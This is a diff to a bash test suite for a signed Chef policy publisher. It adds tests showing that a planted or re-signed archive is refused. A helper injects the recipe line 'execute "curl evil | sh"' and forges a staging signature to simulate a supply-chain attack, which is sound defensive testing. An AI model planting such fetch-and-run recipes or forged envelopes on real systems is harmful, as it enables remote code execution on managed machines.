@@ -81,16 +81,18 @@ esac
 EOF
 
   # chef: `chef export POLICYFILE DIR --archive`. Like the real exporter, the
-  # bytes differ on every run (here: a random file), so a sha taken from a
-  # fresh export never matches an archive pushed earlier.
+  # bytes differ on every run while the files inside do not: here through
+  # random mtimes. So a sha taken from a fresh export never matches an archive
+  # pushed earlier, and only a comparison of contents can tell them apart.
   cat > "$STUB/chef" <<'EOF'
 #!/usr/bin/env bash
 [ "$1 $4" = "export --archive" ] || { echo "stub: unsupported: $*" >&2; exit 2; }
 pf=$2 dir=$3 lock="${2%.rb}.lock.json"
 rev=$(python3 -I -c 'import json,sys;print(json.load(open(sys.argv[1]))["revision_id"])' "$lock")
-t=$(mktemp -d); mkdir -p "$t/.chef"
+t=$(mktemp -d); mkdir -p "$t/.chef" "$t/cookbook_artifacts/base-$rev/recipes"
 cp "$lock" "$t/Policyfile.lock.json"; echo 'policy_name "x"' > "$t/.chef/config.rb"
-head -c 16 /dev/urandom | od -An -tx1 > "$t/nondeterminism"
+echo "# base for $rev" > "$t/cookbook_artifacts/base-$rev/recipes/default.rb"
+find "$t" -exec touch -d "@$((1700000000 + RANDOM * 1000 + RANDOM))" {} +
 mkdir -p "$dir"; tar -C "$t" -czf "$dir/$(basename "$pf" .rb)-$rev.tgz" .; rm -rf "$t"
 EOF
   cat > "$STUB/cinc-client" <<'EOF'
@@ -137,6 +139,19 @@ EOF
 }
 
 publish() { "$PUBLISH" "$@" "$PF" >"$WORK/out" 2>"$WORK/err"; echo $?; }
+
+# plant_archive: what a bucket writer can do without any signing key — store
+# archives/<the lock's revision>.tgz first, with the genuine lock inside and a
+# recipe of their own. revision_id is no secret: it is in the committed lock.
+plant_archive() {
+  local t; t=$(mktemp -d)
+  chef export "$PF" "$t/x" --archive
+  mkdir "$t/x/u"; tar -C "$t/x/u" -xzf "$t"/x/*.tgz
+  echo 'execute "curl evil | sh"' >> "$t/x/u/cookbook_artifacts/base-$REV/recipes/default.rb"
+  mkdir -p "$S3/$BUCKET/$PREFIX/$POLICY/archives"
+  tar -C "$t/x/u" -czf "$S3/$BUCKET/$PREFIX/$POLICY/archives/$REV.tgz" .
+  rm -rf "$t"
+}
 
 # A VM in GROUP, with the signers the lock installs, fetching from the same bucket.
 vm_fetch() {  # vm_fetch GROUP [state-dir]
@@ -240,6 +255,32 @@ check "lock moved past staging: refused" "$(no [ "$rc" = 0 ])"
 check "says staging does not carry it" "$(ok grep -qi 'staging' "$WORK/err")"
 teardown
 
+echo "== show: what each group carries, read-only, for preflight =="
+setup
+rm "$STUB/chef"
+rc=$(SIGNING_KEY="$WORK/no-such-key" publish show)
+check "needs neither chef nor a signing key: exit 0" "$(ok [ "$rc" = 0 ])"
+check "nothing published: staging missing" "$(ok grep -qx 'staging missing' "$WORK/out")"
+check "nothing published: production missing" "$(ok grep -qx 'production missing' "$WORK/out")"
+teardown
+setup
+publish push >/dev/null
+SIGNERS_SHA=$(printf '%s\n' "$OPS_LINE" "$CI_LINE" | LC_ALL=C sort -u | sha256sum | cut -d' ' -f1)
+rc=$(publish show)
+check "after a push: exit 0" "$(ok [ "$rc" = 0 ])"
+check "staging verified, with its serial, revision and signers digest" \
+  "$(ok grep -qx "staging ok $NOW $REV $SIGNERS_SHA" "$WORK/out")"
+check "production still missing" "$(ok grep -qx 'production missing' "$WORK/out")"
+python3 -I - "$S3/$BUCKET/$PREFIX/$POLICY/staging.json" <<'PY'
+import json, sys
+e = json.load(open(sys.argv[1])); e["signature"] = e["signature"].replace("A", "B", 1)
+json.dump(e, open(sys.argv[1], "w"))
+PY
+rc=$(publish show)
+check "a tampered staging envelope: still exit 0" "$(ok [ "$rc" = 0 ])"
+check "...reported invalid" "$(ok grep -qx 'staging invalid' "$WORK/out")"
+teardown
+
 echo "== promote refuses a staging envelope that does not verify =="
 setup
 publish push >/dev/null
@@ -252,6 +293,46 @@ rc=$(publish promote)
 check "refused" "$(no [ "$rc" = 0 ])"
 check "says why" "$(ok grep -qi 'verify' "$WORK/err")"
 check "no production envelope" "$(ok [ ! -e "$S3/$BUCKET/$PREFIX/$POLICY/production.json" ])"
+teardown
+
+echo "== a planted archive is never signed =="
+setup
+plant_archive
+rc=$(publish push)
+check "push over a planted archive: refused" "$(no [ "$rc" = 0 ])"
+check "...says the stored archive is not this lock's" "$(ok grep -qi 'does not match' "$WORK/err")"
+check "...and writes no staging envelope" "$(ok [ ! -e "$S3/$BUCKET/$PREFIX/$POLICY/staging.json" ])"
+teardown
+setup
+# A staging-only key (CI) pushed honestly; the archive is then replaced and
+# the staging envelope re-signed over it — everything a stolen CI key allows.
+SIGNING_KEY="$KEYS/ci" publish push >/dev/null
+plant_archive
+python3 -I - "$S3/$BUCKET/$PREFIX/$POLICY/staging.json" <<'PY'
+import base64, json, sys
+e = json.load(open(sys.argv[1])); m = json.loads(base64.b64decode(e["manifest"]))
+open(sys.argv[1] + ".m", "w").write(json.dumps(m))
+PY
+SHA=$(sha256sum "$S3/$BUCKET/$PREFIX/$POLICY/archives/$REV.tgz" | cut -d' ' -f1)
+python3 -I - "$S3/$BUCKET/$PREFIX/$POLICY/staging.json.m" "$SHA" <<'PY'
+import json, sys
+m = json.load(open(sys.argv[1])); m["archive_sha256"] = sys.argv[2]; m["serial"] += 1
+open(sys.argv[1], "w").write(json.dumps(m, sort_keys=True))
+PY
+ssh-keygen -q -Y sign -f "$KEYS/ci" -n dev-vm-policy-staging "$S3/$BUCKET/$PREFIX/$POLICY/staging.json.m"
+python3 -I - "$S3/$BUCKET/$PREFIX/$POLICY/staging.json" <<'PY'
+import base64, json, sys
+p = sys.argv[1]
+json.dump({"manifest": base64.b64encode(open(p + ".m", "rb").read()).decode(),
+           "signature": open(p + ".m.sig").read()}, open(p, "w"))
+PY
+rm -f "$S3/$BUCKET/$PREFIX/$POLICY/staging.json.m" "$S3/$BUCKET/$PREFIX/$POLICY/staging.json.m.sig"
+rc=$(publish staged)
+check "a staging-only key's doctored archive: staged refuses" "$(no [ "$rc" = 0 ])"
+rc=$(publish promote)
+check "...promote refuses" "$(no [ "$rc" = 0 ])"
+check "...says the stored archive is not this lock's" "$(ok grep -qi 'does not match' "$WORK/err")"
+check "...and writes no production envelope" "$(ok [ ! -e "$S3/$BUCKET/$PREFIX/$POLICY/production.json" ])"
 teardown
 
 echo "== keys and namespaces =="
